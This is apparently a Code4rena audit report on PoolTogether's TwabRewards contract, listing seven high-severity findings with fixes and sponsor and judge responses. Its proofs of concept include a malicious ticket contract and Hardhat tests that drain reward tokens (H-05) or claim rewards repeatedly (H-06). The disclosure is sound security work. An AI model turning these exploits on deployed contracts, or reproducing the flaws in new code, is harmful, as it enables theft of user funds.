@@ -1,0 +1,113 @@
+[H-01]createPromotion()Lack of input validation for_epochDurationcan potentially freeze promotion creator’s funds
+Submitted by WatchPug
+https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L88-L116
+functioncreatePromotion(address_ticket,IERC20_token,uint216_tokensPerEpoch,uint32_startTimestamp,uint32_epochDuration,uint8_numberOfEpochs)externaloverridereturns(uint256) {_requireTicket(_ticket);uint256_nextPromotionId=_latestPromotionId+1;_latestPromotionId=_nextPromotionId;_promotions[_nextPromotionId] =Promotion(msg.sender,_ticket,_token,_tokensPerEpoch,_startTimestamp,_epochDuration,_numberOfEpochs);_token.safeTransferFrom(msg.sender,address(this),_tokensPerEpoch*_numberOfEpochs);emitPromotionCreated(_nextPromotionId);return_nextPromotionId;}
+In the current implementation ofcreatePromotion(),_epochDurationis allowed to be0.
+However, when_epochDuration = 0, it will be impossible for users to claim the rewards, and the promotion creator won’t be able to cancel it.
+Proof of Concept
+Alice calledcreatePromotion()to create a promotion with the following parameters:_token:USDC_tokensPerEpoch:10,000_epochDuration:0_numberOfEpochs:10100,000 USDCwas transferred from Alice to theTwabRewardscontract;Users tries toclaimRewards()but the transaction always revert at_ticket.getAverageTotalSuppliesBetween()->TwabLib.getAverageBalanceBetween()due to div by 0.Alice tries tocancelPromotion()to retrieve the funds, but it always reverts at_requirePromotionActive()since the promotion already ended.
+As a result, Alice’s100,000 USDCis frozen in the contract.
+Recommendation
+Consider addingrequire(_epochDuration > 0)increatePromotion().
+PierrickGT (PoolTogether) marked as duplicate:
+Duplicate ofhttps://github.com/code-423n4/2021-12-pooltogether-findings/issues/29
+LSDan (judge) commented:
+I do not consider this to be a duplicate of #29 because the warden in #29 does not mention this specific failure case. This is indeed an easy to encounter bug that can be triggered as the result of a user error or a frontend bug. Loss of all funds for the promotion would be the result.
+PierrickGT (PoolTogether) confirmed and resolved:
+Implemented the suggested require:https://github.com/pooltogether/v4-periphery/blob/e0010b689fb170daac77af5f62abba7ca1397524/contracts/TwabRewards.sol#L126
+[H-02] Backdated _startTimestamp can lead to loss of funds
+Submitted by csanuragjain, also found by defsec, leastwood, and pauliax
+Impact
+This can lead to loss of funds as there is no recovery function of funds stuck like this
+Proof of Concept
+User A creates a new promotion using createPromotion function. By mistake he provides 1 year ago value for\_startTimestampwith promotion duration as 6 monthsSince there is no check to see that\_startTimestamp > block.timestampso this promotion gets createdUser cannot claim this promotion if they were not having promotion tokens in the 1 year old promotion period. This means promotion amount remains with contractEven promotion creator cannot claim back his tokens since promotion end date has already passed socancelPromotionwill failAs there is no recovery token function in contract so even contract cant transfer this token and the tokens will remain in this contract with no one able to claim those
+Recommended Mitigation Steps
+Add below check in thecreatePromotionfunction
+functioncreatePromotion(address_ticket,IERC20_token,uint216_tokensPerEpoch,uint32_startTimestamp,uint32_epochDuration,uint8_numberOfEpochs)externaloverridereturns(uint256) {require(_startTimestamp>block.timestamp,"should be after current time");}
+PierrickGT (PoolTogether) confirmed and disagreed with severity:
+It would indeed be an unfortunate event and we will implement this require. That being said, funds of the promotion creator would be at risk, because of an error he made, but not funds of a user, so I consider this bug as being of severity 2 (Med Risk) and not 3 (High Risk).
+LSDan (judge) commented:
+Per the Judge Onboarding document provided by Code423n4, this qualifies as a high risk issue. A UI bug or simple mistake could cause complete loss of funds as sponsor acknowledged.3 — High (H): vulns have a risk of 3 and are considered “High” severity when assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).
+[H-03] Continue claiming reqrds after numberOfEpochs are over
+Submitted by gpersoon, also found by 0xabc, csanuragjain, harleythedog, kenzo, and leastwood
+Impact
+When claiming rewards viaclaimRewards(), the function\_calculateRewardAmount()is called.
+The function\_calculateRewardAmount()has a check to make sure the epoch is over
+require(block.timestamp>_epochEndTimestamp,"TwabRewards/epoch-not-over");
+However neither functions check if the\_epochIdis within the range of the reward epochs.
+Ergo it is possible to continue claiming rewards after the reward period is over.
+This only works as long as there are enough tokens in the contract. But this is the case when not everyone has claimed, or other rewards use the same token.
+The proof of concept contains a simplified version of the contract, and shows how this can be done.
+When run in remix you get the following output, while there is only 1 epoch.console.log: Claiming for epoch 1 1 Claiming for epoch 2 1 Claiming for epoch 3 1 Claiming for epoch 4 1 Claiming for epoch 5 1
+Proof of Concept
+// SPDX-License-Identifier: GPL-3.0pragmasolidity0.8.6;import"hardhat/console.sol";contractTwabRewards{structPromotion{uint216tokensPerEpoch;uint32startTimestamp;uint32epochDuration;uint8numberOfEpochs;}mapping(uint256=>Promotion)internal_promotions;uint256internal_latestPromotionId;mapping(uint256=>mapping(address=>uint256))internal_claimedEpochs;constructor() {uintid=createPromotion(1,uint32(block.timestamp)-10,1,1);claimRewards(id,1);claimRewards(id,2);claimRewards(id,3);claimRewards(id,4);claimRewards(id,5);}functioncreatePromotion(uint216_tokensPerEpoch,uint32_startTimestamp,uint32_epochDuration,uint8_numberOfEpochs)publicreturns(uint256) {uint256_nextPromotionId=_latestPromotionId+1;_latestPromotionId=_nextPromotionId;_promotions[_nextPromotionId] =Promotion(_tokensPerEpoch,_startTimestamp,_epochDuration,_numberOfEpochs);return_nextPromotionId;}functionclaimRewards(uint256_promotionId,uint256_epochId)publicreturns(uint256) {Promotionmemory_promotion=_getPromotion(_promotionId);address_user=address(0);uint256_rewardsAmount;uint256_userClaimedEpochs=_claimedEpochs[_promotionId][_user];for(uint256index=0;index<1;index++) {require(!_isClaimedEpoch(_userClaimedEpochs,_epochId),"TwabRewards/rewards-already-claimed");_rewardsAmount+=_calculateRewardAmount(_promotion,_epochId);_userClaimedEpochs=_updateClaimedEpoch(_userClaimedEpochs,_epochId);}_claimedEpochs[_promotionId][_user] =_userClaimedEpochs;console.log("Claiming for epoch",_epochId,_rewardsAmount);return_rewardsAmount;}functiongetPromotion(uint256_promotionId)publicviewreturns(Promotionmemory) {return_getPromotion(_promotionId);}function_getPromotion(uint256_promotionId)internalviewreturns(Promotionmemory) {return_promotions[_promotionId];}function_isClaimedEpoch(uint256_userClaimedEpochs,uint256_epochId)internalpurereturns(bool){return(_userClaimedEpochs>>_epochId) &uint256(1) ==1;}function_calculateRewardAmount(Promotionmemory_promotion,uint256_epochId)internalviewreturns(uint256) {uint256_epochDuration=_promotion.epochDuration;uint256_epochStartTimestamp=_promotion.startTimestamp+ (_epochDuration*_epochId);uint256_epochEndTimestamp=_epochStartTimestamp+_epochDuration;require(block.timestamp>_epochEndTimestamp,"TwabRewards/epoch-not-over");return1;}function_updateClaimedEpoch(uint256_userClaimedEpochs,uint256_epochId)internalpurereturns(uint256) {return_userClaimedEpochs| (uint256(1) <<_epochId);}function_getCurrentEpochId(Promotionmemory_promotion)internalviewreturns(uint256) {return(block.timestamp-_promotion.startTimestamp) /_promotion.epochDuration;}function_getRemainingRewards(Promotionmemory_promotion)internalviewreturns(uint256) {// _tokensPerEpoch * _numberOfEpochsLeftreturn_promotion.tokensPerEpoch*(_promotion.numberOfEpochs-_getCurrentEpochId(_promotion));}}
+Recommended Mitigation Steps
+In the function\_calculateRewardAmount()add something like the following in the beginning after the require.if ( \_epochId >= \_promotion.numberOfEpochs) return 0;
+PierrickGT (PoolTogether) confirmed
+[H-04] cancelPromotion is too rigorous
+Submitted by gpersoon, also found by 0x0x0x, gzeon, harleythedog, hubble, and kenzo
+Impact
+When you cancel a promotion withcancelPromotion()then the promotion is complete deleted.
+This means no-one can claim any rewards anymore, because\_promotions\[\_promotionId]no longer exists.
+It also means all the unclaimed tokens (of the previous epochs) will stay locked in the contract.
+Proof of Concept
+https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L119-L138
+functioncancelPromotion(uint256_promotionId,address_to) ... {...uint256_remainingRewards=_getRemainingRewards(_promotion);delete_promotions[_promotionId];
+Recommended Mitigation Steps
+In the functioncancelPromotion()lower thenumberOfEpochsor set a state variable, to allow user to claim their rewards.
+PierrickGT (PoolTogether) confirmed
+[H-05] Malicious tickets can lead to the loss of all tokens
+Submitted by johnnycash, also found by WatchPug, csanuragjain, gpersoon, gzeon, harleythedog, kemmio, kenzo, leastwood, and pauliax
+Impact
+It allows an attacker to retrieve all the tokens of each promotions.
+Analysis
+Anyone can create a new promotion usingcreatePromotion(). An attacker can create a new malicious promotion with the following parameters:
+the address of a malicious ticket smart contractthe token address from the targeted promotion(s)optionally,_numberOfEpochsequal to 0 to create this promotion for free
+The only verification made on the ticket address given by_requireTicket()is that the smart contract must implement theITicketinterface.
+The attacker can then callclaimRewards()with its wallet address, the malicious promotion id and a single _epochId for the sake of clarity.
+_calculateRewardAmount()is first called to get the reward amount with the following formula(_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween(). The malicious ticket can return an arbitrary_averageBalanceand an_averageTotalSuppliesof 1, leading to an arbitrary large reward amount._promotion.token.safeTransfer(_user, _rewardsAmount)is called. It transfers the amount of tokens previously computed to the attacker.
+The attacker receives the tokens of other promotions without having spent anything.
+Proof of Concept
+The malicious smart contract is a copy/paste ofTicketHarness.solandTicket.solwith the following changes:
+/// @inheritdoc ITicketfunctiongetAverageTotalSuppliesBetween(uint64[]calldata_startTimes,uint64[]calldata_endTimes)externalviewoverridereturns(uint256[]memory) {uint256[]memory_balances=newuint256[](1);_balances[0] =uint256(1);return_balances;}/// @inheritdoc ITicketfunctiongetAverageBalanceBetween(address_user,uint64_startTime,uint64_endTime)externalviewoverridereturns(uint256) {return1337;}
+The test for HardHat is:
+describe('exploit()',async()=>{it('this shouldnt happen',async()=>{constpromotionIdOne=1;constpromotionIdTwo=2;awaitexpect(createPromotion(ticket.address)).to.emit(twabRewards,'PromotionCreated').withArgs(promotionIdOne);letevilTicketFactory=awaitgetContractFactory('EvilTicket');letevilTicket=awaitevilTicketFactory.deploy('EvilTicket','TICK',18,wallet1.address);letcreatePromotionTimestamp= (awaitethers.provider.getBlock('latest')).timestamp;awaitexpect(twabRewards.connect(wallet2).createPromotion(evilTicket.address,rewardToken.address,tokensPerEpoch,createPromotionTimestamp,1,//epochDuration,0,//epochsNumber,)).to.emit(twabRewards,'PromotionCreated').withArgs(promotionIdTwo);awaitincreaseTime(100);constepochIds= ['100'];awaittwabRewards.connect(wallet2).claimRewards(wallet2.address,promotionIdTwo,epochIds);});});
+It results in the following error:
+1) TwabRewardsexploit()this shouldnt happen:Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)
+Recommended Mitigation Steps
+Maybe add a whitelist of trusted tickets?
+PierrickGT (PoolTogether) confirmed
+[H-06] Rewards can be claimed multiple times
+Submitted by johnnycash, also found by certora, cmichel, gpersoon, gzeon, harleythedog, kemmio, kenzo, sirhashalot, and 0x421f
+Impact
+An attacker can claim its reward 256 *epochDurationseconds after the timestamp at which the promotion started. The vulnerability allows him to claim a reward several times to retrieve all the tokens associated to the promotion.
+Analysis
+claimRewards()claim rewards for a given promotion and epoch. In order to prevent a user from claiming a reward multiple times, the mapping_claimedEpochskeeps track of claimed rewards per user:
+/// @notice Keeps track of claimed rewards per user./// @dev _claimedEpochs[promotionId][user] => claimedEpochs/// @dev We pack epochs claimed by a user into a uint256. So we can't store more than 255 epochs.mapping(uint256=>mapping(address=>uint256))internal_claimedEpochs;
+(The comment is wrong, epochs are packed into a uint256 which allows256epochs to be stored).
+_epochIdsis an array ofuint256. For each_epochIdin this array,claimRewards()checks that the reward associated to this_epochIdisn’t already claimed thanks to_isClaimedEpoch()._isClaimedEpoch()checks that the bit_epochIdof_claimedEpochsis unset:
+(_userClaimedEpochs>>_epochId) &uint256(1) ==1;
+However, if_epochIdis greater than 255,_isClaimedEpoch()always returns false. It allows an attacker to claim a reward several times.
+_calculateRewardAmount()just makes use of_epochIdto tell whether the promotion is over.
+Proof of Concept
+The following test should result in a reverted transaction, however the transaction succeeds.
+it('should fail to claim rewards if one or more epochs have already been claimed',async()=>{constpromotionId=1;constwallet2Amount=toWei('750');constwallet3Amount=toWei('250');awaitticket.mint(wallet2.address,wallet2Amount);awaitticket.mint(wallet3.address,wallet3Amount);awaitcreatePromotion(ticket.address);awaitincreaseTime(epochDuration*257);awaitexpect(twabRewards.claimRewards(wallet2.address,promotionId, ['256','256']),).to.be.revertedWith('TwabRewards/rewards-already-claimed');});
+Recommended Mitigation Steps
+A possible fix could be to change the type of_epochIdtouint8in:
+_calculateRewardAmount()_updateClaimedEpoch()_isClaimedEpoch()
+and change the type of_epochIdstouint8[]inclaimRewards().
+PierrickGT (PoolTogether) confirmed
+[H-07] Contract does not work with fee-on transfer tokens
+Submitted by pmerkleplant, also found by GiveMeTestEther, WatchPug, and defsec
+Impact
+There exist ERC20 tokens that charge a fee for every transfer.
+This kind of token does not work correctly with theTwabRewardscontract as the
+rewards calculation for an user is based onpromotion.tokensPerEpoch(see line320).
+However, the actual amount of tokens the contract holds could be less thanpromotion.tokensPerEpoch * promotion.numberOfEpochsleading to not claimable
+rewards for users claiming later than others.
+Recommended Mitigation Steps
+To disable fee-on transfer tokens for the contract, add the following code increatePromotionaround line 11:
+uint256oldBalance=_token.balanceOf(address(this));_token.safeTransferFrom(msg.sender,address(this),_tokensPerEpoch*_numberOfEpochs);uint256newBalance=_token.balanceOf(address(this));require(oldBalance+_tokenPerEpoch*_numberOfEpochs==newBalance);
+PierrickGT (PoolTogether) confirmed
+LSDan (judge) commented:
+This issue results in a direct loss of funds and can happen easily.3 — High (H): vulns have a risk of 3 and are considered “High” severity when assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).
